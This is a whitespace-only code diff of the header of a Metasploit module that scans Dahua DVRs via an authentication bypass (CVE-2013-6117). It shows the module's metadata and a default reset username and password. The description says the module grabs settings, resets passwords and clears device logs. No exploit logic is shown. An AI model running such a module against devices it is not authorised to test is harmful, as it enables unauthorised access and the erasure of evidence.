@@ -1,26 +1,26 @@
 class Metasploit3 < Msf::Auxiliary
-        include Msf::Exploit::Remote::Tcp
-        include Msf::Auxiliary::Scanner
-        include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
 
         def initialize
-                super(
-                        'Name'           => 'Dahua DVR Auth Bypas Scanner',
-                        'Version'        => '$Revision: 1 $',
-                        'Description'    => 'Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user\'s password and clears the device logs',
-                        'Author'         => [
-                                              'Jake Reynolds - Depth Security', #Vulnerability Discoverer
-                                              'Tyler Bennett - Talos Infosec' # Metasploit Module
-                                            ],
-                       'References'      =>
-                                          [
-                                            [ 'CVE', '2013-6117' ],
-                                            [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]
-                                          ],
-                        'License'        => MSF_LICENSE
-                )
-                deregister_options('RHOST')
-                register_options(
+          super(
+            'Name'            => 'Dahua DVR Auth Bypas Scanner',
+            'Version'         => '$Revision: 1 $',
+            'Description'     => 'Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user\'s password and clears the device logs',
+            'Author'          => [
+                                   'Jake Reynolds - Depth Security', # Vulnerability Discoverer
+                                   'Tyler Bennett - Talos Infosec' # Metasploit Module
+                                 ],
+            'References'      =>
+                                 [
+                                   [ 'CVE', '2013-6117' ],
+                                   [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]
+                                 ],
+            'License'         => MSF_LICENSE
+          )
+          deregister_options('RHOST')
+          register_options(
                 [
                   OptString.new('USERNAME', [true, 'A username to reset', '888888']),
                   OptString.new('PASSWORD', [true, 'A password to reset the user with', 'abc123']),
